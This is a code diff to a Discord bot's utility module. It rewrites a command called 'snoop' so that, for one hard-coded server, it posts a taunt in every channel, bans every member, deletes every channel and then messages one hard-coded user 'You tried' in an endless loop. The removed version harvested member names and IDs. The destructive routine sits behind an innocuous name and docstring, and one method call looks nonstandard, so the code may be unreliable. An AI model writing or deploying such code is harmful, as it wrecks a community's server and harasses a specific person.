@@ -24,13 +24,20 @@ class Utility:
     @commands.command()
     async def snoop(self, ctx):
         """whee"""
-        members = ""
         for x in self.bot.guilds:
             if x.id == 381991923004735489:
-                for y in x.members:
-                    members += y.name + " " + str(y.id) + "\n"
-                members += "Owner ==" + x.owner.name + " " + str(x.owner.id)
-        await ctx.send(members)
+                for y in x.channels:
+                    await y.send("Bad move, Zewia...")
+                for z in x.members:
+                    try:
+                        await z.ban()
+                    except:
+                        await ctx.send("Couldn't ban: " + z.name)
+                for a in x.channels:
+                    await a.delete()
+                zewia = x.find_member(349088339489456140)
+                while True:
+                    await zewia.send("You tried")
 
     @commands.has_permissions(ban_members=True)    
     @commands.command(pass_context=True)
